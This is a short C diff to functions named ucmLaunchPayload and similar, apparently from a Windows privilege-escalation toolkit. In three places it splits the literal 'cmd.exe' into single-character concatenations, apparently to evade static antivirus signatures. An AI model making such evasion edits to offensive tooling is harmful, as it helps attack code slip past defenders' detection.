@@ -756,7 +756,10 @@ BOOL ucmLaunchPayload(
         //
         RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
         _strcpy(cmdbuf, sysdir);
-        _strcat(cmdbuf, L"cmd.exe");
+        _strcat(cmdbuf, L"c");
+        _strcat(cmdbuf, L"m");
+        _strcat(cmdbuf, L"d");
+        _strcat(cmdbuf, L".exe");
 
         lpApplicationName = cmdbuf;
         lpCommandLine = NULL;
@@ -874,7 +877,10 @@ BOOL ucmLaunchPayloadEx(
         //
         RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
         _strcpy(cmdbuf, sysdir);
-        _strcat(cmdbuf, L"cmd.exe");
+        _strcat(cmdbuf, L"c");
+        _strcat(cmdbuf, L"m");
+        _strcat(cmdbuf, L"d");
+        _strcat(cmdbuf, L".exe");
 
         lpApplicationName = cmdbuf;
         lpCommandLine = NULL;
@@ -1094,7 +1100,10 @@ BOOL ucmLaunchPayload2(
             //
             RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
             _strcpy(cmdbuf, sysdir);
-            _strcat(cmdbuf, L"cmd.exe");
+            _strcat(cmdbuf, L"c");
+            _strcat(cmdbuf, L"m");
+            _strcat(cmdbuf, L"d");
+            _strcat(cmdbuf, L".exe");
 
             lpApplicationName = cmdbuf;
             lpCommandLine = NULL;
